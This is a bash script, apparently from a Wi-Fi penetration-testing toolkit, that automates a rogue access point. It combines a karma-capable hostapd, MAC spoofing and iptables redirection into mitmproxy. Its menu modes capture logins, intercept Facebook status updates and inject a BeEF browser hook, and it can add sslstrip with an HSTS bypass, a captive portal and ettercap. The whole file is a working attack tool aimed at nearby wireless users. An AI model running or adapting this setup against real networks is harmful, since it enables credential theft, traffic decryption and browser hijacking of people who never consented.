#!/bin/bash
# Author: MaMe82

# The interface used for providing the hotspot
SCRIPTPATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd)"

source $SCRIPTPATH/setup.conf
NOW=$(date +"%F_%H_%M")
LOGPREFIX=$LOGDIR/${NOW}_

echo "Logging to $LOGPREFIX"

# path to karma-capable hostapd (from mana-toolkit)
hostapd=/usr/lib/mana-toolkit/hostapd


# delete TmpWorkDir if existent an recreate
rm -R ${TMPWORKDIR} 1>&2> /dev/null
mkdir -p ${TMPWORKDIR}
# copy certs to temporary path
cp -R  ${SCRIPTPATH}/cert ${TMPWORKDIR}/cert




#build conf files
source $SCRIPTPATH/build_hostapd_conf
source $SCRIPTPATH/build_dhcpd_conf
source $SCRIPTPATH/build_apache_conf


#Create log-dir if no existent
if [[ ! -e $LOGDIR ]]; then
	mkdir -p $LOGDIR
fi


function correct_hosts
{
	if $(cat /etc/hosts | grep -q $(hostname))
	then
		echo "/etc/hosts correct"
	else
		echo "/etc/hosts not correct, fixing ..."
		echo 127.0.0.1 `hostname` >> /etc/hosts
	fi
}


function add_unmanaged_mac()
{
        nwmconf="/etc/NetworkManager/NetworkManager.conf"
        unmanaged_mac=$1

        changed=false
        echo "Exclude WLAN interface with MAC $unmanaged_mac from NetworkManager configuration ..."
        sed -i -e 's/plugins=.*/plugins=ifupdown,keyfile/' $nwmconf

        # check if keyfile section is present, add otherwise
        if grep -q -E '^\[keyfile\]' $nwmconf; then
                echo "... [keyfile] section present in $nwmconf"
        else
                echo "... [keyfile] section missing in $nwmconf, adding it"
                echo >> $nwmconf
                echo "[keyfile]" >> $nwmconf
                changed=true
        fi

        # check if exlude entry for our MAC is present, add it otherwise
        # ToDo: it isn't checked if a matching entry belongs to [keyfile] section (but could be assumed)
        if grep -q -E "^unmanaged-devices=$unmanaged_mac" $nwmconf; then
                echo "... unmanaged-device entry present for $unmanaged_mac"
        else
                echo "... unmanaged-device entry missing for $unmanaged_mac, adding it"
                sed -i -e "s/\[keyfile\]/&\nunmanaged-devices=$unmanaged_mac/" $nwmconf
                changed=true
        fi

        #echo "Changed $changed"
        if $changed; then return 0; else return 1; fi
}


echo "Checking if MAC address of hotspot interface is excluded from NetworkManager config"
if add_unmanaged_mac $interface_hotspot_mac; then
        echo "Configuration of NetworkManager has been changed, restarting"
	service network-manager restart
fi


function getMACAddr()
{
	ip link show $1 | grep link | awk '{print $2}'
}

interface_hotspot_mac=$(getMACAddr $interface_hotspot)
echo "Hotspot IF MAC: $interface_hotspot_mac"


function disable_network_manager()
{
	echo
}



function start_in_new_terminal
{
	if [ $use_nethunter == true ]; then
		echo "======================================================"
		echo "issue the following command in new Terminal"
		echo $@
		echo "======================================================"
	else
		gnome-terminal -e "${@}" 2> /dev/null
	fi
	#echo $@
}

function start_mitm 
{
  # export env var to force writing keylog, which is needed for decryption
  # in case SSL key exchange is based on DIFFIE HELLMAN
  
  export MITMPROXY_SSLKEYLOGFILE=$LOGDIR/SSLkey.log
	
  #clear
  option=0
  until [ "$option" = "99" ]; do
  echo "Select MITM-Proxy mode"
  echo "======================"
  echo
  echo "  (1) Start MITM-Proxy interactive"
  echo "  (2) Start MITM-Proxy (captue logins, intercept facebook updatestatus)"
  echo "  (3) Start mitmdump - Turning pictures to black-and-white and mark with payload"
  echo "  (4) Start mitmdump - Injecting BeEF-Hook (EXPERIMENTAL)"

  echo -n "Enter choice: "
  read option
  echo ""

  case $option in
	1 ) MITMPROXY_RUNNING=true;start_in_new_terminal "mitmproxy -p 8443 -T --cadir $TMPWORKDIR/cert/ --host --stream 100k" ; break;;
	2 ) MITMPROXY_RUNNING=true;start_in_new_terminal "mitmproxy -p 8443 -T --cadir $TMPWORKDIR/cert/ --host -f \"login | Login | sl/password | updatestatus\" -i \"updatestatus\""; break ;;
	3 ) MITMDUMP_RUNNING=true;start_in_new_terminal "mitmdump -p 8443 -T --cadir $TMPWORKDIR/cert/ --host -s $SCRIPTPATH/mitmproxy-scripts/mark_pictures.py --anticache"; break ;;
	4 ) MITMDUMP_RUNNING=true;start_in_new_terminal "mitmdump -p 8443 -T --cadir $TMPWORKDIR/cert/ --host -s $SCRIPTPATH/mitmproxy-scripts/modify_response_header_beef.py --anticache"; break ;;
	* ) echo "Please enter 1, 2, 3 or 4";; 
  esac

 done
 
}

function ask_for_cp 
{
  option=0
  
  read -p "Run Captive Portal (y/n) default (y): " option



  case $option in
	No|no|N|n ) ENABLE_CP=false;echo "Disable Captive Portal";;
	Yes|yes|Y|y|* ) ENABLE_CP=true;echo "Enable Captive Portal";;
  esac
  echo ""
 
}


function ask_for_sslstrip
{
  option=0

  read -p "Run SSLSTRIP (y/n) default (n): " option
  


  case $option in
	Yes|yes|Y|y ) ENABLE_SSLSTRIP=true;echo "Enable SSLStrip";;
	No|no|N|n|* ) ENABLE_SSLSTRIP=false;echo "Disable SSLStrip";;
	
  esac
  
  if [ "$ENABLE_SSLSTRIP" == true ]
  then
  echo "Remark:"
  echo "If SSLStrip is runned in conjuction with MITMPROXY"
  echo "plain http-traffic wouldn't be redirected to MITMPROXY"
  echo "and must be captured separately (e.g. ettercap, wireshark)"
  echo "MITMProxy scripts won't work for plain HTTP!!!"
  
  fi
  echo
  
 
}


function ask_for_mitmproxy
{
  option=0
  read -p "Run MITMPROXY/MITMDUMP (y/n) default (y): " option
  


  case $option in
	No|no|N|n ) ENABLE_MITMPROXY=false;echo "Disable MITMPROXY/MITMDUMP";;
	Yes|yes|Y|y|* ) ENABLE_MITMPROXY=true;echo "Enable MITMPROXY/MITMDUMP";;
	
	
  esac
  echo ""
 
}

function start_ettercap
{
  option=0
  read -p "Start ettercap in new terminal (y/n) default (n): " option
  


  case $option in
	
	Yes|yes|Y|y ) ETTERCAP_RUNNING=true;start_in_new_terminal "ettercap -p -u -T -q -i $interface_hotspot";;
	No|no|N|n|* ) echo "ettercap could be launched by hand";;
	
  esac
  echo ""
 
}


create_hostapd_conf ${TMPWORKDIR}/hostapd.conf
create_dhcpd_conf ${TMPWORKDIR}/dhcpd.conf

# ToDo: only needed if cp is started --> move to if
restore_enabled_virtual_hosts
ask_for_cp
ask_for_sslstrip
ask_for_mitmproxy


correct_hosts
rfkill unblock wlan
# change mac, if not running nethunter, using wlan0 (built-in wifi) as hotspot-interface
if [ $use_nethunter != true ] || [ $interface_hotspot != 'wlan0' ]
then
	# set random mac for Hotspot interface
	echo changing interface mac
	ifconfig $interface_hotspot down
	macchanger -r $interface_hotspot
	# configure ip for hotspot_interface
	ifconfig $interface_hotspot $interface_hotspot_ip netmask $interface_hotspot_netmask up
	sleep 2
else
	#bring prepare local interface for hostapd (code is device specific and works on Galaxy S3 i9300 running CM-12.1)

	echo "reconfiguring wlan0 of i9300 (no change of MAC adress possible)..."
	# wpa_supplicant runs if wlan0 is connected to a wifi
	killall wpa_supplicant 2> /dev/null 1>/dev/null
	# dnsmasq runs if wlan0 is working in ap mode and provides a dhcp server (thus interferres with dhcpd later on)
	killall dnsmasq 2> /dev/null 1> /dev/null
	# remove kernel module for bcm4334 wifi chip
	rmmod dhd 2>&1 > /dev/null
	# reinstall kernel module, with firmware/nvram for hostapd
	insmod /system/lib/modules/dhd.ko "firmware_path=/system/etc/wifi/bcmdhd_apsta.bin nvram_path=/system/etc/wifi/nvram_net.txt"
	# bring up wlan0 with settings according to setup.conf
	ifconfig $interface_hotspot $interface_hotspot_ip netmask $interface_hotspot_netmask up
	sleep 2
	# copy route to table 97 (local_network) otherwise incoming packets are always routed via rmnet adapter
fi

# configure ip for hotspot_interface done above
# ifconfig $interface_hotspot $interface_hotspot_ip netmask $interface_hotspot_netmask

# be the gateway to the local net of the hotspot
echo "Setting up route for gateway..."
route add -net $net_hotspot netmask $interface_hotspot_netmask gw $interface_hotspot_ip


#start hostapd
echo "Starting hostapd..."

$hostapd $TMPWORKDIR/hostapd.conf > ${LOGPREFIX}hostapd.log &
sleep 5

if [ $use_nethunter == true ] && [ $interface_upstream == 'rmnet0' ]
then
	# copy route to table 97 (local_network) otherwise incoming packets are always routed via rmnet adapter
	# this has to be run after hostapd startup, otherwise route gets deleted
	echo "Adding route for wlan0 to local_network routing-table"
	new_routes="`ip route show table main|grep \"src $interface_hotspot_ip\"`"
	echo "Adding \"$new_routes\" ! "
	ip route add $new_routes table 97
	ip route flush cache
fi


# create lease file
touch $TMPWORKDIR/dhcpd.leases
#start dhcp-server on hotspot interface
dhcpd -lf $TMPWORKDIR/dhcpd.leases -cf $TMPWORKDIR/dhcpd.conf $interface_hotspot



# ToDo: Backup old routing setting
#enable routing
echo '1' > /proc/sys/net/ipv4/ip_forward
#default-policy aller chains auf accept
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT

#ToDo: Backup old iptables settings
#clean iptables
iptables -t mangle -F
#iptables -t mangle -X $portal_chain
iptables -t filter -F
iptables -t nat -F

# MASQUERADING on internet-interface (replace host source-ip, by own ip)
iptables -t nat -A POSTROUTING -o $interface_upstream -j MASQUERADE


#start portal webservice
if [ "$ENABLE_CP" == true ]
then
	python cp.py -i $interface_hotspot -h $interface_hotspot_ip -p 8080 &
fi


# ToDo: Logprefix von dns2proxy_no_debug.py muss neu geschrieben werden


if [ "$ENABLE_SSLSTRIP" == true ]
then
	# Replace Target-IP of arriving DNS-Packets by the IP of Hotspot-Interface, thus that they are rooted to this interface
	# dns-requests get handled by dns2proxy
	iptables -t nat -A PREROUTING -i $interface_hotspot -p udp --dport 53 -j DNAT --to $interface_hotspot_ip
	#start dns2proxy on interface_hotspot (sslstrip should be started before, to allow dns2proxy to revert hsts changes)
	
	echo "Start dns2proxy for sslstrip"
	python $SCRIPTPATH/sslstrip-hsts/dns2proxy_no_debug.py $interface_hotspot $LOGDIR > /dev/null&
	#python dns2proxy_no_debug.py $interface_hotspot&
	##########
	# sslstrip (with hsts bypass, dns2proxy needed to revert changes)
	# works only if the user starts with a non https entry-point
	##########
	# python sslstrip.py -l 10000 -a -w ${LOGPREFIX}sslstrip.log&
	echo "Start sslstrip for sslstrip"
	python $SCRIPTPATH/sslstrip-hsts/sslstrip.py -w ${LOGPREFIX}sslstrip.log 2>&1 > /dev/null&

	#iptables -t nat -A PREROUTING -i $interface_hotspot -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	#iptables -t nat -A PREROUTING -i $interface_hotspot -p tcp ! -d $interface_hotspot_ip -port 80 -j REDIRECT --to-port 10000
	iptables -t nat -A PREROUTING -i $interface_hotspot -p tcp ! -d $interface_hotspot_ip --destination-port 80 -j REDIRECT --to-port 10000
else
	# pass-through arriving dns-traffic, so dns2proxy isn't needed (could be ussed for logging purpose)
	#let dns pass (solve by dnsspoof for marked pakets later on)
	# note: REQUEST_URIs got rewritten by apache2 mod_rewrite
	iptables -t filter -I FORWARD -m mark --mark 99  -p udp --dport 53 -j ACCEPT
fi



##########
# MITM_Proxy
############
if [ "$ENABLE_MITMPROXY" == true ]
then
	# rule for port 80 is fighting with sslstrip if enabled
	if [ "$ENABLE_SSLSTRIP" != true ]
	then
		iptables -t nat -A PREROUTING -m mark ! --mark 99 -p tcp ! -d $interface_hotspot_ip --dport 80 -j REDIRECT --to-port 8443
	fi

	iptables -t nat -A PREROUTING -m mark ! --mark 99 -p tcp ! -d $interface_hotspot_ip --dport 443 -j REDIRECT --to-port 8443
	
	# start mitmproxy / mtimdump externally
	start_mitm 
fi

start_ettercap
echo "=============================================="
echo "Hotspot is up and running!"
echo "Hit <Enter> to kill hotspot and revert changes"
echo "=============================================="
read

###############################################
# Kill all and revert changes
#############################################

# create WLAN list from hostapd log (karma)
$SCRIPTPATH/parselog.sh ${LOGPREFIX}hostapd.log

pkill dhcpd
pkill sslstrip
pkill sslsplit
pkill hostapd
pkill python
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -t nat -F
iptables -t mangle -F

if [ "$ENABLE_CP" == true ]
then
	echo "Killing CP..."
	# ToDo: SIGTERM has to be sent to Captive Portal Process
	killall python
fi

if [ "$MITMDUMP_RUNNING" == true ]
then
	echo "Killing mitmdump..."
	killall mitmdump
fi

if [ "$MITMPROXY_RUNNING" == true ]
then
	echo "Killing mitmproxy..."
	killall mitmproxy
fi

if [ "$ETTERCAP_RUNNING" == true ]
then
	echo "Killing ettercap..."
	killall ettercap
fi

#service stunnel4 stop
#service ssh stop
